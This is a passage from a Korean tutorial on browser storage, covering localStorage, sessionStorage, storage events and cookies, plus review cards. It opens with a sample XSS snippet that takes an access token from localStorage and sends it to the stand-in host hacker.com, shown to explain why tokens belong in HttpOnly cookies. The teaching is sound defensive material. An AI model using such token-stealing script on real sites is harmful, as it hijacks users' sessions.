// 😈 해커가 XSS 공격(스크립트 주입)으로 정보를 훔치는 예시 코드

// 1. 로컬 스토리지에 저장된 'accessToken'을 몰래 꺼내 변수에 담습니다.
const token = localStorage.getItem('accessToken');

// 2. 해커의 서버(hacker.com)로 훔친 토큰을 전송합니다.
fetch(`https://hacker.com?steal=${token}`);

// 결과: 토큰 탈취 성공! (이제 해커가 내 아이디로 로그인할 수 있게 됨)
```

**💡 올바른 보안 습관**

**권장 사항**

| **구분** | **핵심 내용** |
| --- | --- |
| **로그인 토큰 관리** | • **HttpOnly Cookie** 사용 권장<br>• **이유**: 자바스크립트(`document.cookie`)로 접근할 수 없어, 해커가 스크립트로 훔쳐갈 수 없으므로 **XSS 방어**에 유리함 |
| **저장 가능한 것**(안전한 데이터) | • 보안과 무관한 데이터들<br>• **예**: 테마 설정(다크 모드), 비로그인 장바구니 목록, UI 상태(메뉴 펼침/접힘) 등 |
| **입력값 검증** | • 저장된 데이터가 변조되었을 수 있음<br>• 데이터를 무조건 믿지 말고 **항상 검증 로직**을 거쳐야 함 |

**개념 정리**

<div class="wda-callout wda-ci">
  <strong>XSS (Cross Site Scripting)</strong> — '크로스 사이트 스크립팅'이라고 읽습니다. 해커가 게시판 댓글이나 입력창 등에 악성 자바스크립트 코드를 심어놓고, 이 글을 보는 다른 사용자의 브라우저에서 그 코드가 실행되게 하여 정보를 탈취하는 해킹 수법입니다.<br><br>
  <strong>HttpOnly Cookie</strong> — 일반적인 쿠키와 달리, 브라우저가 서버와 통신할 때만 자동으로 사용하고 자바스크립트로는 건드릴 수 없게 만든 '보안 강화 쿠키'입니다. 금고 열쇠를 사용자(JS)에게 주지 않고 은행(브라우저)이 직접 관리하는 것과 비슷합니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>8. 브라우저별 특이사항 ("모든 브라우저가 똑같진 않아요!")</h2>
</div>

**📌 Safari의 엄격함**

| **구분** | **핵심 내용** |
| --- | --- |
| **2.5MB 제한** | • 모바일 Safari는 용량 정책이 매우 보수적이라, 다른 브라우저보다 적은 용량(약 **2.5MB**)만 허용될 수 있습니다. |
| **7일 제한**(ITP 정책) | • 사용자가 **7일 동안** 해당 사이트에 방문하지 않으면, 브라우저가 데이터를 **자동으로 삭제**해 버리기도 합니다. |
| **💡 Tip** | • Safari 사용자를 고려한다면, 중요한 데이터는 스토리지에만 믿고 맡기지 말고 **항상 서버에 백업**해야 합니다. |

**📌 시크릿 모드 (Incognito)**

| **구분** | **핵심 내용** |
| --- | --- |
| **HDD가 아닌 RAM 사용** | • '흔적을 남기지 않는다'는 목적을 위해, 하드 디스크가 아닌 **휘발성 메모리(RAM)**에 데이터를 저장합니다. |
| **창 닫으면 증발** | • 브라우저 창을 닫거나 끄는 순간 저장했던 **모든 데이터가 즉시 사라집니다.** |
| **💡 Tip** | • 메모리 용량은 디스크보다 작고 제한적이므로, **용량 초과 에러(`QuotaExceededError`)**가 더 자주 발생할 수 있습니다. |

**개념 정리**

<div class="wda-callout wda-ci">
  <strong>ITP (Intelligent Tracking Prevention)</strong> — 애플이 사용자의 개인정보 보호를 위해 만든 추적 방지 기술입니다. 광고 회사가 쿠키나 스토리지 등을 이용해 사용자를 끈질기게 따라다니며 정보를 수집하는 것을 막기 위해, 오랫동안 접속하지 않은 사이트의 데이터를 강제로 지워버리는 강력한 정책입니다.
</div>

**RAM vs HDD 비교**

| **구분** | **비유** | **특징 및 동작 방식** |
| --- | --- | --- |
| **HDD/SSD**(보조기억장치) | **'창고'** 📦 | • 전원을 꺼도 데이터가 영구적으로 남아있습니다.<br>• 브라우저의 **일반 모드**에서는 이곳에 데이터를 저장합니다. |
| **RAM**(주기억장치) | **'작업 책상'** 🪑 | • 전원을 끄면 데이터가 모두 날아가는 휘발성 공간입니다.<br>• **시크릿 모드**는 보안을 위해 책상 위에서만 작업하고, 창을 닫으면 책상을 싹 치워버리는(삭제하는) 방식입니다. |

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>9. storage 이벤트</h2>
</div>

**📌 탭 간 동기화 (다른 탭에서 변경 감지하기)**

- **기능** — 브라우저의 **다른 탭이나 창**에서 로컬 스토리지 데이터가 변경되었을 때, 이를 실시간으로 감지하는 이벤트입니다.
- **코드 예시**: `window.addEventListener`를 사용하여 `storage` 이벤트를 구독합니다.

<div class="wda-callout wda-cw">
  ⚠️ <strong>중요 주의사항</strong> — 데이터를 변경한 <strong>당사자 탭(현재 탭)에서는 이벤트가 발생하지 않습니다.</strong> 오직 나를 제외한 <strong>다른 탭</strong>들에게만 "데이터가 바뀌었어!"라고 알려줍니다.
</div>

```js
// 다른 탭에서 localStorage 데이터가 변경될 때 실행되는 코드
window.addEventListener('storage', (e) => {
  console.log('변경 감지됨!');
  console.log('변경된 키:', e.key);       // 예: 'theme', 'user'
  console.log('이전 값:', e.oldValue);    // 변경 전의 값
  console.log('새 값:', e.newValue);      // 변경 후의 값
  console.log('출처:', e.url);            // 변경이 발생한 페이지 URL

  // 예: 다른 탭에서 테마를 바꿨다면, 이 탭도 따라서 바꿈
  if (e.key === 'theme') {
    applyTheme(e.newValue);
  }
});
```

**💡 활용 예시**

<div class="wda-fgrid">
  <div class="wda-fcard">
    <div class="wda-fcard-ttl">로그아웃 동기화</div>
    <div class="wda-fcard-dsc">탭 A에서 로그아웃하면, 열려있던 탭 B, C, D도 자동으로 로그아웃 처리하여 보안을 유지합니다.</div>
  </div>
  <div class="wda-fcard">
    <div class="wda-fcard-ttl">실시간 테마 동기화</div>
    <div class="wda-fcard-dsc">한 탭에서 '다크 모드'를 켜면, 모든 탭이 즉시 다크 모드로 변환됩니다.</div>
  </div>
</div>

```js
// --- [탭 A] ---
// 사용자가 로그아웃 버튼을 클릭 -> 데이터 삭제
localStorage.removeItem('user');

// --- [탭 B, C, D] ---
// 다른 탭에서 데이터가 삭제된 것을 자동으로 감지!
window.addEventListener('storage', (e) => {
  // 'user' 키가 변경되었고, 새 값이 없다면(삭제되었다면)
  if (e.key === 'user' && !e.newValue) {
    // 즉시 로그인 페이지로 이동시켜버림 (강제 로그아웃)
    window.location.href = '/login';
  }
});
```

**💡 보충 설명**

<div class="wda-callout wda-ci">
  <strong>이벤트 속성 상세</strong><br>
  • <code>key</code>: 어떤 데이터 상자(키)가 건드려졌는지 알려줍니다.<br>
  • <code>oldValue</code>: 바뀌기 전의 내용물입니다.<br>
  • <code>newValue</code>: 바뀐 후의 새 내용물입니다. (삭제된 경우 <code>null</code>이 됩니다)<br><br>
  <strong>왜 같은 탭에선 안 울리나요?</strong> — 내가 바꾼 건 내가 알고 있기 때문입니다. 굳이 이벤트를 발생시켜서 알려줄 필요가 없으며, 불필요한 중복 실행을 막기 위함입니다.<br><br>
  <strong>SessionStorage는 안 돼요</strong> — 탭 간 동기화 목적으로는 <code>localStorage</code>를 사용할 때 의미가 큽니다. <code>sessionStorage</code>는 탭별로 독립적이기 때문에 일반적인 다른 탭 간 동기화 용도로는 적합하지 않습니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>10. Cookie란 무엇인가?</h2>
</div>

**⚙️ 서버 전송 메커니즘**

| **구분** | **핵심 내용** |
| --- | --- |
| **정의** | • 브라우저에 저장되지만, **모든 HTTP 요청마다 서버로 자동 전송**되는 데이터입니다. |
| **역할** | • **"서버와 대화하기 위한 작은 쪽지"** 역할을 합니다. |
| **동작 방식** | • 브라우저가 서버에 페이지를 요청할 때, 가지고 있는 쿠키를 **헤더(Header)**에 담아서 같이 보냅니다. |

```http
// [브라우저 -> 서버] 요청을 보낼 때 헤더에 쿠키가 자동으로 실려감
GET /mypage HTTP/1.1
Host: www.example.com
Cookie: session_id=abc1234; theme=dark
```

**📌 특징과 한계**

| **구분** | **핵심 내용** |
| --- | --- |
| **4KB 제한** | • 저장 용량이 매우 작습니다. (문자열만 저장 가능) |
| **네트워크 낭비** | • 매 요청마다 서버로 전송되므로, 쿠키 데이터가 크면 인터넷 속도가 느려질 수 있습니다. |
| **만료 기한 (Expires)** | • 로컬 스토리지와 달리, 지정된 날짜가 지나면 자동으로 삭제됩니다. |

**📝 쿠키 설정 방법**

| **방법** | **설명 및 특징** |
| --- | --- |
| **서버에서 설정** (권장) | • 응답 헤더(`Set-Cookie`)를 이용해 브라우저에게 "이거 저장해!"라고 명령합니다.<br>• 보안 옵션(`HttpOnly`)을 붙일 수 있어 더 안전합니다. |
| **클라이언트에서 설정** (JavaScript) | • 자바스크립트로 직접 만들 수도 있습니다. |

```js
// 1. 서버에서 설정하는 예시 (HTTP 응답 헤더)
// Set-Cookie: session_id=1234; HttpOnly; Secure

// 2. 클라이언트(JS)에서 설정하는 예시
document.cookie = "theme=dark; path=/";
```

**💡 보충 설명**

<div class="wda-callout wda-ci">
  <strong>어원(Magic Cookie)</strong> — 유닉스(UNIX) 용어에서 유래했지만, "헨젤과 그레텔" 동화에서 과자를 먹으며 흘리는 부스러기처럼 <strong>'사용자의 흔적'</strong>이 남는다는 의미로 기억하면 이해하기 쉽습니다.<br><br>
  <strong>로컬 스토리지와의 차이점</strong> — 로컬 스토리지는 브라우저(내 컴퓨터)에만 남아있고 서버로 날아가지 않지만, 쿠키는 계속 서버로 배달된다는 점이 가장 큰 차이입니다.<br>
  따라서 데이터 양이 많으면 쿠키 대신 스토리지 사용을 권장합니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>11. Cookie vs localStorage (비교 요약)</h2>
</div>

**🆚 저장소별 특성 비교**

| **특성** | **LocalStorage** | **SessionStorage** | **Cookie** |
| --- | --- | --- | --- |
| **데이터 공유** | 도메인 내 **모든 탭** | 탭별 독립 (**공유 X**) | 도메인 내 **모든 탭** |
| **용량** | **~5MB** | **~5MB** | **~4KB** (매우 작음) |
| **서버 전송** | ❌ (**클라이언트 전용**) | ❌ (**클라이언트 전용**) | **자동 전송** (모든 요청) |
| **접근 제어** | 자바스크립트 Only | 자바스크립트 Only | **HttpOnly** 설정 시 차단 가능 |
| **주요 용도** | 테마, 장바구니 | 폼 임시 저장 | 인증 세션 또는 인증 정보 (`HttpOnly`, `Secure`, `SameSite` 설정 권장), 트래킹 |

**💡 상황별 사용 가이드 (언제 뭘 써야 할까?)**

<div class="wda-compare">
  <div class="wda-compare-card">
    <div class="wda-compare-ttl">🍪 Cookie 사용</div>
    <ul>
      <li><strong>서버가 읽어야 하는 데이터</strong></li>
      <li><strong>인증 정보</strong> (반드시 <code>HttpOnly</code> 설정)</li>
      <li><strong>만료 시간</strong>이 필요한 데이터</li>
      <li>광고 트래킹 (3rd party)</li>
    </ul>
  </div>
  <div class="wda-compare-card">
    <div class="wda-compare-ttl">🗄️ LocalStorage 사용</div>
    <ul>
      <li><strong>클라이언트만 쓰는 데이터</strong> (서버 전송 불필요)</li>
      <li><strong>UI 설정</strong> (테마, 언어 등)</li>
      <li>보안과 무관한 <strong>비민감 캐시 데이터</strong></li>
      <li><strong>큰 용량</strong>이 필요할 때</li>
    </ul>
  </div>
</div>

**💡 보충 설명**

<div class="wda-callout wda-ci">
  Cookie는 서버가 읽어야 하는 인증 정보에 사용할 수 있습니다. 단, 보안이 필요한 인증 정보는 반드시 <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> 같은 옵션을 함께 고려해야 합니다.<br><br>
  <strong>Access Token을 localStorage에 저장하는 것은 XSS에 취약하므로 권장하지 않습니다.</strong><br>
  인증 정보가 꼭 브라우저에 저장되어야 한다면, JavaScript로 접근할 수 없는 <strong>HttpOnly Cookie</strong> 방식을 우선 고려합니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>✅ 핵심 요약</h2>
</div>

**📌 먼저 외울 것**

<div class="wda-check-note">
  <ul>
    <li><strong>localStorage</strong>는 브라우저를 꺼도 유지되고, <strong>sessionStorage</strong>는 탭을 닫으면 즉시 삭제된다. (둘 다 도메인당 약 <strong>5MB</strong>)</li>
    <li>Web Storage는 오직 <strong>문자열</strong>만 저장할 수 있으므로, 객체/배열은 <code>JSON.stringify()</code>로 저장하고 <code>JSON.parse()</code>로 복원해야 한다.</li>
    <li>setItem/getItem은 <strong>동기적</strong>으로 동작해 큰 데이터를 다루면 화면이 멈출 수 있으므로, 대용량 데이터는 비동기인 <strong>IndexedDB</strong>를 쓴다.</li>
    <li>localStorage는 <strong>Same-Origin</strong>(프로토콜+도메인+포트)별로 철저히 분리되며, 서브도메인도 별도 저장소를 가진다.</li>
    <li><strong>storage 이벤트</strong>는 다른 탭에서 데이터가 바뀔 때만 발생하며, 변경한 당사자 탭에서는 발생하지 않는다.</li>
    <li>브라우저 저장소는 F12로 누구나 볼 수 있어 비밀번호·토큰 같은 <strong>민감 정보를 저장하면 안 되며</strong>, 인증 정보는 <strong>HttpOnly Cookie</strong>를 권장한다.</li>
    <li>쿠키는 매 요청마다 서버로 자동 전송되고 용량이 <strong>4KB</strong>로 작지만, localStorage는 서버로 전송되지 않고 <strong>5MB</strong>까지 저장 가능하다.</li>
  </ul>
</div>

**🧠 헷갈리기 쉬운 것**

<div class="wda-mistake-notes">
  <div class="wda-mistake-note">
    <div class="wda-mistake-wrong">오해: localStorage에 객체를 그대로 setItem하면 그대로 저장된다?</div>
    <div class="wda-mistake-right">정답: 문자열로 자동 변환되며 객체를 그대로 넣으면 <code>[object Object]</code>로 깨져 저장된다. 반드시 <strong>JSON.stringify()</strong>로 변환해야 한다.</div>
  </div>
  <div class="wda-mistake-note">
    <div class="wda-mistake-wrong">오해: sessionStorage도 localStorage처럼 새 탭에서 공유된다?</div>
    <div class="wda-mistake-right">정답: sessionStorage는 <strong>탭 단위로 독립적</strong>이라 같은 사이트를 새 탭으로 열어도 데이터가 공유되지 않는다.</div>
  </div>
  <div class="wda-mistake-note">
    <div class="wda-mistake-wrong">오해: localStorage는 브라우저를 끄지 않는 한 절대 사라지지 않는 영구 저장소다?</div>
    <div class="wda-mistake-right">정답: 사용자가 직접 삭제하거나 브라우저 정책(예: Safari의 7일 ITP 정책)·시크릿 모드에 따라 사라질 수 있어 <strong>절대적인 영구 저장소가 아니다</strong>.</div>
  </div>
  <div class="wda-mistake-note">
    <div class="wda-mistake-wrong">오해: storage 이벤트는 데이터를 변경한 그 탭에서도 발생한다?</div>
    <div class="wda-mistake-right">정답: 변경한 당사자 탭에서는 발생하지 않고, <strong>나를 제외한 다른 탭에서만</strong> 발생한다.</div>
  </div>
  <div class="wda-mistake-note">
    <div class="wda-mistake-wrong">오해: 로그인 토큰(Access Token)도 localStorage에 저장하는 것이 안전하다?</div>
    <div class="wda-mistake-right">정답: localStorage는 <strong>XSS 공격에 취약</strong>해 토큰이 탈취될 수 있으므로, 인증 정보는 자바스크립트로 접근할 수 없는 <strong>HttpOnly Cookie</strong>에 저장하는 것이 안전하다.</div>
  </div>
</div>

**🎯 최종 암기 공식**

<div class="wda-formula-board">
  <div class="wda-formula-block">
    <div class="wda-formula-block-ttl">공식 1 · 수명</div>
    <div class="wda-formula-block-body"><code>local=영구, session=탭 닫으면 소멸</code></div>
  </div>
  <div class="wda-formula-block">
    <div class="wda-formula-block-ttl">공식 2 · 객체 저장</div>
    <div class="wda-formula-block-body"><code>stringify(저장) / parse(복원)</code></div>
  </div>
  <div class="wda-formula-block">
    <div class="wda-formula-block-ttl">공식 3 · 용량</div>
    <div class="wda-formula-block-body"><code>Storage ~5MB, Cookie ~4KB</code></div>
  </div>
  <div class="wda-formula-block">
    <div class="wda-formula-block-ttl">공식 4 · 보안</div>
    <div class="wda-formula-block-body"><code>민감정보 X, 인증정보=HttpOnly Cookie</code></div>
  </div>
</div>

**🎴 클릭 복습 카드**

<div class="wda-flip-deck">
  <div class="wda-flip-card">
    <div class="wda-flip-front">localStorage와 sessionStorage의 가장 큰 차이는?</div>
    <div class="wda-flip-back">localStorage는 브라우저를 꺼도 유지되고, sessionStorage는 탭을 닫으면 즉시 삭제된다.</div>
  </div>
  <div class="wda-flip-card">
    <div class="wda-flip-front">객체를 localStorage에 저장하려면 어떤 함수를 써야 하나?</div>
    <div class="wda-flip-back">JSON.stringify()로 문자열로 변환한 뒤 저장하고, 꺼낼 때는 JSON.parse()로 복원한다.</div>
  </div>
  <div class="wda-flip-card">
    <div class="wda-flip-front">localStorage.getItem으로 없는 키를 조회하면 무엇을 반환하나?</div>
    <div class="wda-flip-back">null. 에러가 나지 않는다.</div>
  </div>
  <div class="wda-flip-card">
    <div class="wda-flip-front">Web Storage 작업이 동기적이라는 것은 어떤 의미인가?</div>
    <div class="wda-flip-back">저장/조회가 끝날 때까지 브라우저가 멈추므로, 대용량 데이터는 성능 문제가 생길 수 있어 비동기인 IndexedDB를 고려해야 한다.</div>
  </div>
  <div class="wda-flip-card">
    <div class="wda-flip-front">storage 이벤트는 언제, 어느 탭에서 발생하나?</div>
    <div class="wda-flip-back">다른 탭에서 localStorage가 변경될 때 발생하며, 변경한 당사자 탭에서는 발생하지 않는다.</div>
  </div>
  <div class="wda-flip-card">
    <div class="wda-flip-front">로컬 스토리지에 저장하면 안 되는 데이터는?</div>
    <div class="wda-flip-back">비밀번호, 주민등록번호, Access Token 같은 민감 정보. F12로 누구나 볼 수 있고 XSS에 취약하다.</div>
  </div>
  <div class="wda-flip-card">
    <div class="wda-flip-front">쿠키와 localStorage의 가장 큰 차이는?</div>
    <div class="wda-flip-back">쿠키는 매 HTTP 요청마다 서버로 자동 전송되고 용량이 4KB로 작지만, localStorage는 서버로 전송되지 않고 약 5MB까지 저장 가능하다.</div>
  </div>
  <div class="wda-flip-card">
    <div class="wda-flip-front">인증 토큰을 안전하게 저장하려면 어떤 방식을 쓰나?</div>
    <div class="wda-flip-back">자바스크립트로 접근할 수 없는 HttpOnly Cookie를 사용한다.</div>
  </div>
</div>
